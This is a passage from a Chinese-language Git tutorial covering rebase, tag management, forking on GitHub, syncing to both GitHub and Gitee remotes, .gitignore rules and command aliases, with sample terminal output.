<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git pull</span><br><span class="line">remote: Counting objects: 3, done.</span><br><span class="line">remote: Compressing objects: 100% (1&#x2F;1), done.</span><br><span class="line">remote: Total 3 (delta 1), reused 3 (delta 1), pack-reused 0</span><br><span class="line">Unpacking objects: 100% (3&#x2F;3), done.</span><br><span class="line">From github.com:michaelliao&#x2F;learngit</span><br><span class="line">   d1be385..f005ed4  master     -&gt; origin&#x2F;master</span><br><span class="line"> * [new tag]         v1.0       -&gt; v1.0</span><br><span class="line">Auto-merging hello.py</span><br><span class="line">Merge made by the &#39;recursive&#39; strategy.</span><br><span class="line"> hello.py | 1 +</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br></pre></td></tr></table></figure>

<p>再用<code>git status</code>看看状态：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Your branch is ahead of &#39;origin&#x2F;master&#39; by 3 commits.</span><br><span class="line">  (use &quot;git push&quot; to publish your local commits)</span><br><span class="line"></span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure>

<p>加上刚才合并的提交，现在我们本地分支比远程分支超前3个提交。</p>
<p>用<code>git log</code>看看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --graph --pretty&#x3D;oneline --abbrev-commit</span><br><span class="line">*   e0ea545 (HEAD -&gt; master) Merge branch &#39;master&#39; of github.com:michaelliao&#x2F;learngit</span><br><span class="line">|\  </span><br><span class="line">| * f005ed4 (origin&#x2F;master) set exit&#x3D;1</span><br><span class="line">* | 582d922 add author</span><br><span class="line">* | 8875536 add comment</span><br><span class="line">|&#x2F;  </span><br><span class="line">* d1be385 init hello</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>对强迫症童鞋来说，现在事情有点不对头，提交历史分叉了。如果现在把本地分支push到远程，有没有问题？</p>
<p>有！</p>
<p>什么问题？</p>
<p>不好看！</p>
<p>有没有解决方法？</p>
<p>有！</p>
<p>这个时候，rebase就派上了用场。我们输入命令<code>git rebase</code>试试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git rebase</span><br><span class="line">First, rewinding head to replay your work on top of it...</span><br><span class="line">Applying: add comment</span><br><span class="line">Using index info to reconstruct a base tree...</span><br><span class="line">M	hello.py</span><br><span class="line">Falling back to patching base and 3-way merge...</span><br><span class="line">Auto-merging hello.py</span><br><span class="line">Applying: add author</span><br><span class="line">Using index info to reconstruct a base tree...</span><br><span class="line">M	hello.py</span><br><span class="line">Falling back to patching base and 3-way merge...</span><br><span class="line">Auto-merging hello.py</span><br></pre></td></tr></table></figure>

<p>输出了一大堆操作，到底是啥效果？再用<code>git log</code>看看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --graph --pretty&#x3D;oneline --abbrev-commit</span><br><span class="line">* 7e61ed4 (HEAD -&gt; master) add author</span><br><span class="line">* 3611cfe add comment</span><br><span class="line">* f005ed4 (origin&#x2F;master) set exit&#x3D;1</span><br><span class="line">* d1be385 init hello</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>原本分叉的提交现在变成一条直线了！这种神奇的操作是怎么实现的？其实原理非常简单。我们注意观察，发现Git把我们本地的提交“挪动”了位置，放到了<code>f005ed4 (origin/master) set exit=1</code>之后，这样，整个提交历史就成了一条直线。rebase操作前后，最终的提交内容是一致的，但是，我们本地的commit修改内容已经变化了，它们的修改不再基于<code>d1be385 init hello</code>，而是基于<code>f005ed4 (origin/master) set exit=1</code>，但最后的提交<code>7e61ed4</code>内容是一致的。</p>
<p>这就是rebase操作的特点：把分叉的提交历史“整理”成一条直线，看上去更直观。缺点是本地的分叉提交已经被修改过了。</p>
<p>最后，通过push操作把本地分支推送到远程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mac:~&#x2F;learngit michael$ git push origin master</span><br><span class="line">Counting objects: 6, done.</span><br><span class="line">Delta compression using up to 4 threads.</span><br><span class="line">Compressing objects: 100% (5&#x2F;5), done.</span><br><span class="line">Writing objects: 100% (6&#x2F;6), 576 bytes | 576.00 KiB&#x2F;s, done.</span><br><span class="line">Total 6 (delta 2), reused 0 (delta 0)</span><br><span class="line">remote: Resolving deltas: 100% (2&#x2F;2), completed with 1 local object.</span><br><span class="line">To github.com:michaelliao&#x2F;learngit.git</span><br><span class="line">   f005ed4..7e61ed4  master -&gt; master</span><br></pre></td></tr></table></figure>

<p>再用<code>git log</code>看看效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --graph --pretty&#x3D;oneline --abbrev-commit</span><br><span class="line">* 7e61ed4 (HEAD -&gt; master, origin&#x2F;master) add author</span><br><span class="line">* 3611cfe add comment</span><br><span class="line">* f005ed4 set exit&#x3D;1</span><br><span class="line">* d1be385 init hello</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>远程分支的提交历史也是一条直线。</p>
<p>小结：</p>
<p>rebase操作可以把本地未push的分叉提交历史整理成直线；</p>
<p>rebase的目的是使得我们在查看历史提交的变化时更容易，因为分叉的提交需要三方对比。</p>
<h2 id="标签管理"><a href="#标签管理" class="headerlink" title="标签管理"></a>标签管理</h2><p>发布一个版本时，我们通常先在版本库中打一个标签（tag），这样，就唯一确定了打标签时刻的版本。将来无论什么时候，取某个标签的版本，就是把那个打标签的时刻的历史版本取出来。所以，标签也是版本库的一个快照。</p>
<p>Git的标签虽然是版本库的快照，但其实它就是指向某个commit的指针（跟分支很像对不对？但是分支可以移动，标签不能移动），所以，创建和删除标签都是瞬间完成的。</p>
<p>Git有commit，为什么还要引入tag？</p>
<p>“请把上周一的那个版本打包发布，commit号是6a5819e…”</p>
<p>“一串乱七八糟的数字不好找！”</p>
<p>如果换一个办法：</p>
<p>“请把上周一的那个版本打包发布，版本号是v1.2”</p>
<p>“好的，按照tag v1.2查找commit就行！”</p>
<p>所以，tag就是一个让人容易记住的有意义的名字，它跟某个commit绑在一起。</p>
<h3 id="创建标签"><a href="#创建标签" class="headerlink" title="创建标签"></a>创建标签</h3><p>在Git中打标签非常简单，首先，切换到需要打标签的分支上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">* dev</span><br><span class="line">  master</span><br><span class="line">$ git checkout master</span><br><span class="line">Switched to branch &#39;master&#39;</span><br></pre></td></tr></table></figure>

<p>然后，敲命令<code>git tag &lt;name&gt;</code>就可以打一个新标签：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git tag v1.0</span><br></pre></td></tr></table></figure>

<p>可以用命令<code>git tag</code>查看所有标签：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git tag</span><br><span class="line">v1.0</span><br></pre></td></tr></table></figure>

<p>默认标签是打在最新提交的commit上的。有时候，如果忘了打标签，比如，现在已经是周五了，但应该在周一打的标签没有打，怎么办？</p>
<p>方法是找到历史提交的commit id，然后打上就可以了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --pretty&#x3D;oneline --abbrev-commit</span><br><span class="line">12a631b (HEAD -&gt; master, tag: v1.0, origin&#x2F;master) merged bug fix 101</span><br><span class="line">4c805e2 fix bug 101</span><br><span class="line">e1e9c68 merge with no-ff</span><br><span class="line">f52c633 add merge</span><br><span class="line">cf810e4 conflict fixed</span><br><span class="line">5dc6824 &amp; simple</span><br><span class="line">14096d0 AND simple</span><br><span class="line">b17d20e branch test</span><br><span class="line">d46f35e remove test.txt</span><br><span class="line">b84166e add test.txt</span><br><span class="line">519219b git tracks changes</span><br><span class="line">e43a48b understand how stage works</span><br><span class="line">1094adb append GPL</span><br><span class="line">e475afc add distributed</span><br><span class="line">eaadf4e wrote a readme file</span><br></pre></td></tr></table></figure>

<p>比方说要对<code>add merge</code>这次提交打标签，它对应的commit id是<code>f52c633</code>，敲入命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git tag v0.9 f52c633</span><br></pre></td></tr></table></figure>

<p>再用命令<code>git tag</code>查看标签：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git tag</span><br><span class="line">v0.9</span><br><span class="line">v1.0</span><br></pre></td></tr></table></figure>

<p>注意，标签不是按时间顺序列出，而是按字母排序的。可以用<code>git show &lt;tagname&gt;</code>查看标签信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git show v0.9</span><br><span class="line">commit f52c63349bc3c1593499807e5c8e972b82c8f286 (tag: v0.9)</span><br><span class="line">Author: Michael Liao &lt;askxuefeng@gmail.com&gt;</span><br><span class="line">Date:   Fri May 18 21:56:54 2018 +0800</span><br><span class="line"></span><br><span class="line">    add merge</span><br><span class="line"></span><br><span class="line">diff --git a&#x2F;readme.txt b&#x2F;readme.txt</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>可以看到，<code>v0.9</code>确实打在<code>add merge</code>这次提交上。</p>
<p>还可以创建带有说明的标签，用<code>-a</code>指定标签名，<code>-m</code>指定说明文字：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git tag -a v0.1 -m &quot;version 0.1 released&quot; 1094adb</span><br></pre></td></tr></table></figure>

<p>用命令<code>git show &lt;tagname&gt;</code>可以看到说明文字：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git show v0.1</span><br><span class="line">tag v0.1</span><br><span class="line">Tagger: Michael Liao &lt;askxuefeng@gmail.com&gt;</span><br><span class="line">Date:   Fri May 18 22:48:43 2018 +0800</span><br><span class="line"></span><br><span class="line">version 0.1 released</span><br><span class="line"></span><br><span class="line">commit 1094adb7b9b3807259d8cb349e7df1d4d6477073 (tag: v0.1)</span><br><span class="line">Author: Michael Liao &lt;askxuefeng@gmail.com&gt;</span><br><span class="line">Date:   Fri May 18 21:06:15 2018 +0800</span><br><span class="line"></span><br><span class="line">    append GPL</span><br><span class="line"></span><br><span class="line">diff --git a&#x2F;readme.txt b&#x2F;readme.txt</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>注意：标签总是和某个commit挂钩。如果这个commit既出现在master分支，又出现在dev分支，那么在这两个分支上都可以看到这个标签。</p>
<p>小结：</p>
<p>命令<code>git tag &lt;tagname&gt;</code>用于新建一个标签，默认为<code>HEAD</code>，也可以指定一个commit id；</p>
<p>命令<code>git tag -a &lt;tagname&gt; -m &quot;blablabla...&quot;</code>可以指定标签信息；</p>
<p>命令<code>git tag</code>可以查看所有标签。</p>
<h3 id="操作标签"><a href="#操作标签" class="headerlink" title="操作标签"></a>操作标签</h3><p>如果标签打错了，也可以删除：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git tag -d v0.1</span><br><span class="line">Deleted tag &#39;v0.1&#39; (was f15b0dd)</span><br></pre></td></tr></table></figure>

<p>因为创建的标签都只存储在本地，不会自动推送到远程。所以，打错的标签可以在本地安全删除。</p>
<p>如果要推送某个标签到远程，使用命令<code>git push origin &lt;tagname&gt;</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git push origin v1.0</span><br><span class="line">Total 0 (delta 0), reused 0 (delta 0)</span><br><span class="line">To github.com:michaelliao&#x2F;learngit.git</span><br><span class="line"> * [new tag]         v1.0 -&gt; v1.0</span><br></pre></td></tr></table></figure>

<p>或者，一次性推送全部尚未推送到远程的本地标签：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git push origin --tags</span><br><span class="line">Total 0 (delta 0), reused 0 (delta 0)</span><br><span class="line">To github.com:michaelliao&#x2F;learngit.git</span><br><span class="line"> * [new tag]         v0.9 -&gt; v0.9</span><br></pre></td></tr></table></figure>

<p>如果标签已经推送到远程，要删除远程标签就麻烦一点，先从本地删除：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git tag -d v0.9</span><br><span class="line">Deleted tag &#39;v0.9&#39; (was f52c633)</span><br></pre></td></tr></table></figure>

<p>然后，从远程删除。删除命令也是push，但是格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git push origin :refs&#x2F;tags&#x2F;v0.9</span><br><span class="line">To github.com:michaelliao&#x2F;learngit.git</span><br><span class="line"> - [deleted]         v0.9</span><br></pre></td></tr></table></figure>

<p>要看看是否真的从远程库删除了标签，可以登陆GitHub查看。</p>
<p>小结：</p>
<p>命令<code>git push origin &lt;tagname&gt;</code>可以推送一个本地标签；</p>
<p>命令<code>git push origin --tags</code>可以推送全部未推送过的本地标签；</p>
<p>命令<code>git tag -d &lt;tagname&gt;</code>可以删除一个本地标签；</p>
<p>命令<code>git push origin :refs/tags/&lt;tagname&gt;</code>可以删除一个远程标签。</p>
<h2 id="使用Github"><a href="#使用Github" class="headerlink" title="使用Github"></a>使用Github</h2><p>我们一直用GitHub作为免费的远程仓库，如果是个人的开源项目，放到GitHub上是完全没有问题的。其实GitHub还是一个开源协作社区，通过GitHub，既可以让别人参与你的开源项目，也可以参与别人的开源项目。</p>
<p>在GitHub出现以前，开源项目开源容易，但让广大人民群众参与进来比较困难，因为要参与，就要提交代码，而给每个想提交代码的群众都开一个账号那是不现实的，因此，群众也仅限于报个bug，即使能改掉bug，也只能把diff文件用邮件发过去，很不方便。</p>
<p>但是在GitHub上，利用Git极其强大的克隆和分支功能，广大人民群众真正可以第一次自由参与各种开源项目了。</p>
<p>如何参与一个开源项目呢？比如人气极高的bootstrap项目，这是一个非常强大的CSS框架，你可以访问它的项目主页<a href="https://github.com/twbs/bootstrap" target="_blank" rel="noopener">https://github.com/twbs/bootstrap</a> 点“Fork”就在自己的账号下克隆了一个bootstrap仓库，然后，从自己的账号下clone：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone git@github.com:michaelliao&#x2F;bootstrap.git</span><br></pre></td></tr></table></figure>

<p>一定要从自己的账号下clone仓库，这样你才能推送修改。如果从bootstrap的作者的仓库地址<code>git@github.com:twbs/bootstrap.git</code>克隆，因为没有权限，你将不能推送修改。</p>
<p>Bootstrap的官方仓库<code>twbs/bootstrap</code>、你在GitHub上克隆的仓库<code>my/bootstrap</code>，以及你自己克隆到本地电脑的仓库，他们的关系就像下图显示的那样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌─ GitHub ────────────────────────────────────┐</span><br><span class="line">│                                             │</span><br><span class="line">│ ┌─────────────────┐     ┌─────────────────┐ │</span><br><span class="line">│ │ twbs&#x2F;bootstrap  │────&gt;│  my&#x2F;bootstrap   │ │</span><br><span class="line">│ └─────────────────┘     └─────────────────┘ │</span><br><span class="line">│                                  ▲          │</span><br><span class="line">└──────────────────────────────────┼──────────┘</span><br><span class="line">                                   ▼</span><br><span class="line">                          ┌─────────────────┐</span><br><span class="line">                          │ local&#x2F;bootstrap │</span><br><span class="line">                          └─────────────────┘</span><br></pre></td></tr></table></figure>

<p>如果你想修复bootstrap的一个bug，或者新增一个功能，立刻就可以开始干活，干完后，往自己的仓库推送。</p>
<p>如果你希望bootstrap的官方库能接受你的修改，你就可以在GitHub上发起一个pull request。当然，对方是否接受你的pull request就不一定了。</p>
<p>小结：</p>
<p>在GitHub上，可以任意Fork开源仓库；</p>
<p>自己拥有Fork后的仓库的读写权限；</p>
<p>可以推送pull request给官方仓库来贡献代码。</p>
<h2 id="使用Gitee"><a href="#使用Gitee" class="headerlink" title="使用Gitee"></a>使用Gitee</h2><p>使用GitHub时，国内的用户经常遇到的问题是访问速度太慢，有时候还会出现无法连接的情况（原因你懂的）。</p>
<p>如果我们希望体验Git飞一般的速度，可以使用国内的Git托管服务——<a href="https://gitee.com/?utm_source=blog_lxf" target="_blank" rel="noopener">Gitee</a>（<a href="https://gitee.com/?utm_source=blog_lxf" target="_blank" rel="noopener">gitee.com</a>）。</p>
<p>和GitHub相比，Gitee也提供免费的Git仓库。此外，还集成了代码质量检测、项目演示等功能。对于团队协作开发，Gitee还提供了项目管理、代码托管、文档管理的服务，5人以下小团队免费。</p>
<p>Gitee的免费版本也提供私有库功能，只是有5人的成员上限。</p>
<p>使用Gitee和使用GitHub类似，我们在Gitee上注册账号并登录后，需要先上传自己的SSH公钥。</p>
<p>一个本地库能不能既关联GitHub，又关联Gitee呢？</p>
<p>答案是肯定的，因为git本身是分布式版本控制系统，可以同步到另外一个远程库，当然也可以同步到另外两个远程库。</p>
<p>使用多个远程库时，我们要注意，git给远程库起的默认名称是<code>origin</code>，如果有多个远程库，我们需要用不同的名称来标识不同的远程库。</p>
<p>仍然以<code>learngit</code>本地库为例，我们先删除已关联的名为<code>origin</code>的远程库：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote rm origin</span><br></pre></td></tr></table></figure>

<p>然后，先关联GitHub的远程库：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote add github git@github.com:michaelliao&#x2F;learngit.git</span><br></pre></td></tr></table></figure>

<p>注意，远程库的名称叫<code>github</code>，不叫<code>origin</code>了。</p>
<p>接着，再关联Gitee的远程库：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote add gitee git@gitee.com:liaoxuefeng&#x2F;learngit.git</span><br></pre></td></tr></table></figure>

<p>同样注意，远程库的名称叫<code>gitee</code>，不叫<code>origin</code>。</p>
<p>现在，我们用<code>git remote -v</code>查看远程库信息，可以看到两个远程库：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote -v</span><br><span class="line">gitee	git@gitee.com:liaoxuefeng&#x2F;learngit.git (fetch)</span><br><span class="line">gitee	git@gitee.com:liaoxuefeng&#x2F;learngit.git (push)</span><br><span class="line">github	git@github.com:michaelliao&#x2F;learngit.git (fetch)</span><br><span class="line">github	git@github.com:michaelliao&#x2F;learngit.git (push)</span><br></pre></td></tr></table></figure>

<p>如果要推送到GitHub，使用命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push github master</span><br></pre></td></tr></table></figure>

<p>如果要推送到Gitee，使用命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push gitee master</span><br></pre></td></tr></table></figure>

<p>这样一来，我们的本地库就可以同时与多个远程库互相同步：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌─────────┐ ┌─────────┐</span><br><span class="line">│ GitHub  │ │  Gitee  │</span><br><span class="line">└─────────┘ └─────────┘</span><br><span class="line">     ▲           ▲</span><br><span class="line">     └─────┬─────┘</span><br><span class="line">           │</span><br><span class="line">    ┌─────────────┐</span><br><span class="line">    │ Local Repo  │</span><br><span class="line">    └─────────────┘</span><br></pre></td></tr></table></figure>

<p>Gitee也同样提供了Pull request功能，可以让其他小伙伴参与到开源项目中来。</p>
<h2 id="自定义Git"><a href="#自定义Git" class="headerlink" title="自定义Git"></a>自定义Git</h2><p>在安装Git后，配置了<code>user.name</code>和<code>user.email</code>，实际上，Git还有很多可配置项。</p>
<p>比如，让Git显示颜色，会让命令输出看起来更醒目：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global color.ui true</span><br></pre></td></tr></table></figure>

<p>这样，Git会适当地显示不同的颜色，比如<code>git status</code>命令：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210329161128.png" alt="git-color"></p>
<p>文件名就会标上颜色。</p>
<h3 id="忽略特殊文件"><a href="#忽略特殊文件" class="headerlink" title="忽略特殊文件"></a>忽略特殊文件</h3><p>有些时候，你必须把某些文件放到Git工作目录中，但又不能提交它们，比如保存了数据库密码的配置文件啦，等等，每次<code>git status</code>都会显示<code>Untracked files ...</code>，有强迫症的童鞋心里肯定不爽。</p>
<p>好在Git考虑到了大家的感受，这个问题解决起来也很简单，在Git工作区的根目录下创建一个特殊的<code>.gitignore</code>文件，然后把要忽略的文件名填进去，Git就会自动忽略这些文件。</p>
<p>不需要从头写<code>.gitignore</code>文件，GitHub已经为我们准备了各种配置文件，只需要组合一下就可以使用了。所有配置文件可以直接在线浏览：<a href="https://github.com/github/gitignore" target="_blank" rel="noopener">https://github.com/github/gitignore</a></p>
<p>忽略文件的原则是：</p>
<ol>
<li>忽略操作系统自动生成的文件，比如缩略图等；</li>
<li>忽略编译生成的中间文件、可执行文件等，也就是如果一个文件是通过另一个文件自动生成的，那自动生成的文件就没必要放进版本库，比如Java编译产生的<code>.class</code>文件；</li>
<li>忽略你自己的带有敏感信息的配置文件，比如存放口令的配置文件。</li>
</ol>
<p>举个例子：</p>
<p>假设你在Windows下进行Python开发，Windows会自动在有图片的目录下生成隐藏的缩略图文件，如果有自定义目录，目录下就会有<code>Desktop.ini</code>文件，因此你需要忽略Windows自动生成的垃圾文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Windows:</span><br><span class="line">Thumbs.db</span><br><span class="line">ehthumbs.db</span><br><span class="line">Desktop.ini</span><br></pre></td></tr></table></figure>

<p>然后，继续忽略Python编译产生的<code>.pyc</code>、<code>.pyo</code>、<code>dist</code>等文件或目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Python:</span><br><span class="line">*.py[cod]</span><br><span class="line">*.so</span><br><span class="line">*.egg</span><br><span class="line">*.egg-info</span><br><span class="line">dist</span><br><span class="line">build</span><br></pre></td></tr></table></figure>

<p>加上你自己定义的文件，最终得到一个完整的<code>.gitignore</code>文件，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Windows:</span><br><span class="line">Thumbs.db</span><br><span class="line">ehthumbs.db</span><br><span class="line">Desktop.ini</span><br><span class="line"></span><br><span class="line"># Python:</span><br><span class="line">*.py[cod]</span><br><span class="line">*.so</span><br><span class="line">*.egg</span><br><span class="line">*.egg-info</span><br><span class="line">dist</span><br><span class="line">build</span><br><span class="line"></span><br><span class="line"># My configurations:</span><br><span class="line">db.ini</span><br><span class="line">deploy_key_rsa</span><br></pre></td></tr></table></figure>

<p>最后一步就是把<code>.gitignore</code>也提交到Git，就完成了！当然检验<code>.gitignore</code>的标准是<code>git status</code>命令是不是说<code>working directory clean</code>。</p>
<p>使用Windows的童鞋注意了，如果你在资源管理器里新建一个<code>.gitignore</code>文件，它会非常弱智地提示你必须输入文件名，但是在文本编辑器里“保存”或者“另存为”就可以把文件保存为<code>.gitignore</code>了。</p>
<p>有些时候，你想添加一个文件到Git，但发现添加不了，原因是这个文件被<code>.gitignore</code>忽略了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add App.class</span><br><span class="line">The following paths are ignored by one of your .gitignore files:</span><br><span class="line">App.class</span><br><span class="line">Use -f if you really want to add them.</span><br></pre></td></tr></table></figure>

<p>如果你确实想添加该文件，可以用<code>-f</code>强制添加到Git：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add -f App.class</span><br></pre></td></tr></table></figure>

<p>或者你发现，可能是<code>.gitignore</code>写得有问题，需要找出来到底哪个规则写错了，可以用<code>git check-ignore</code>命令检查：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git check-ignore -v App.class</span><br><span class="line">.gitignore:3:*.class	App.class</span><br></pre></td></tr></table></figure>

<p>Git会告诉我们，<code>.gitignore</code>的第3行规则忽略了该文件，于是我们就可以知道应该修订哪个规则。</p>
<p>还有些时候，当我们编写了规则排除了部分文件时：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 排除所有.开头的隐藏文件:</span><br><span class="line">.*</span><br><span class="line"># 排除所有.class文件:</span><br><span class="line">*.class</span><br></pre></td></tr></table></figure>

<p>但是我们发现<code>.*</code>这个规则把<code>.gitignore</code>也排除了，并且<code>App.class</code>需要被添加到版本库，但是被<code>*.class</code>规则排除了。</p>
<p>虽然可以用<code>git add -f</code>强制添加进去，但有强迫症的童鞋还是希望不要破坏<code>.gitignore</code>规则，这个时候，可以添加两条例外规则：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 排除所有.开头的隐藏文件:</span><br><span class="line">.*</span><br><span class="line"># 排除所有.class文件:</span><br><span class="line">*.class</span><br><span class="line"></span><br><span class="line"># 不排除.gitignore和App.class:</span><br><span class="line">!.gitignore</span><br><span class="line">!App.class</span><br></pre></td></tr></table></figure>

<p>把指定文件排除在<code>.gitignore</code>规则外的写法就是<code>!</code>+文件名，所以，只需把例外文件添加进去即可。</p>
<p>小结：</p>
<p>忽略某些文件时，需要编写<code>.gitignore</code>；</p>
<p><code>.gitignore</code>文件本身要放到版本库里，并且可以对<code>.gitignore</code>做版本管理！</p>
<h3 id="配置别名"><a href="#配置别名" class="headerlink" title="配置别名"></a>配置别名</h3><p>有没有经常敲错命令？比如<code>git status</code>？<code>status</code>这个单词真心不好记。</p>
<p>如果敲<code>git st</code>就表示<code>git status</code>那就简单多了，当然这种偷懒的办法我们是极力赞成的。</p>
<p>我们只需要敲一行命令，告诉Git，以后<code>st</code>就表示<code>status</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global alias.st status</span><br></pre></td></tr></table></figure>

<p>当然还有别的命令可以简写，很多人都用<code>co</code>表示<code>checkout</code>，<code>ci</code>表示<code>commit</code>，<code>br</code>表示<code>branch</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global alias.co checkout</span><br><span class="line">$ git config --global alias.ci commit</span><br><span class="line">$ git config --global alias.br branch</span><br></pre></td></tr></table></figure>

<p>以后提交就可以简写成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git ci -m &quot;bala bala bala...&quot;</span><br></pre></td></tr></table></figure>

<p><code>--global</code>参数是全局参数，也就是这些命令在这台电脑的所有Git仓库下都有用。</p>
<p>在撤销修改一节中，我们知道，命令<code>git reset HEAD file</code>可以把暂存区的修改撤销掉（unstage），重新放回工作区。既然是一个unstage操作，就可以配置一个<code>unstage</code>别名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global alias.unstage &#39;reset HEAD&#39;</span><br></pre></td></tr></table></figure>

<p>当你敲入命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git unstage test.py</span><br></pre></td></tr></table></figure>

<p>实际上Git执行的是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git reset HEAD test.py</span><br></pre></td></tr></table></figure>

<p>配置一个<code>git last</code>，让其显示最后一次提交信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global alias.last &#39;log -1&#39;</span><br></pre></td></tr></table></figure>

<p>这样，用<code>git last</code>就能显示最近一次的提交：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git last</span><br><span class="line">commit adca45d317e6d8a4b23f9811c3d7b7f0f180bfe2</span><br><span class="line">Merge: bd6ae48 291bea8</span><br><span class="line">Author: Michael Liao &lt;askxuefeng@gmail.com&gt;</span><br><span class="line">Date:   Thu Aug 22 22:49:22 2013 +0800</span><br><span class="line"></span><br><span class="line">    merge &amp; fix hello.py</span><br></pre></td></tr></table></figure>

<p>甚至还有人丧心病狂地把<code>lg</code>配置成了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global alias.lg &quot;log --color --graph --pretty&#x3D;format:&#39;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#39; --abbrev-commit&quot;</span><br></pre></td></tr></table></figure>

<p>来看看<code>git lg</code>的效果：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210329162439.png" alt="git-lg"></p>
<p>配置文件</p>
<p>配置Git的时候，加上<code>--global</code>是针对当前用户起作用的，如果不加，那只针对当前的仓库起作用。</p>
<p>配置文件放哪了？每个仓库的Git配置文件都放在<code>.git/config</code>文件中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat .git&#x2F;config </span><br><span class="line">[core]</span><br><span class="line">    repositoryformatversion &#x3D; 0</span><br><span class="line">    filemode &#x3D; true</span><br><span class="line">    bare &#x3D; false</span><br><span class="line">    logallrefupdates &#x3D; true</span><br><span class="line">    ignorecase &#x3D; true</span><br><span class="line">    precomposeunicode &#x3D; true</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">    url &#x3D; git@github.com:michaelliao&#x2F;learngit.git</span><br><span class="line">    fetch &#x3D; +refs&#x2F;heads&#x2F;*:refs&#x2F;remotes&#x2F;origin&#x2F;*</span><br><span class="line">[branch &quot;master&quot;]</span><br><span class="line">    remote &#x3D; origin</span><br><span class="line">    merge &#x3D; refs&#x2F;heads&#x2F;master</span><br><span class="line">[alias]</span><br><span class="line">    last &#x3D; log -1</span><br></pre></td></tr></table></figure>

<p>别名就在<code>[alias]</code>后面，要删除别名，直接把对应的行删掉即可。</p>
<p>而当前用户的Git配置文件放在用户主目录下的一个隐藏文件<code>.gitconfig</code>中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat .gitconfig</span><br><span class="line">[alias]</span><br><span class="line">    co &#x3D; checkout</span><br><span class="line">    ci &#x3D; commit</span><br><span class="line">    br &#x3D; branch</span><br><span class="line">    st &#x3D; status</span><br><span class="line">[user]</span><br><span class="line">    name &#x3D; Your Name</span><br><span class="line">    email &#x3D; your@email.com</span><br></pre></td></tr></table></figure>

<p>配置别名也可以直接修改这个文件，如果改错了，可以删掉文件重新通过命令配置。</p>
<p>小结：</p>
<p>给Git配置好别名，就可以输入命令时偷个懒。我们鼓励偷懒。</p>
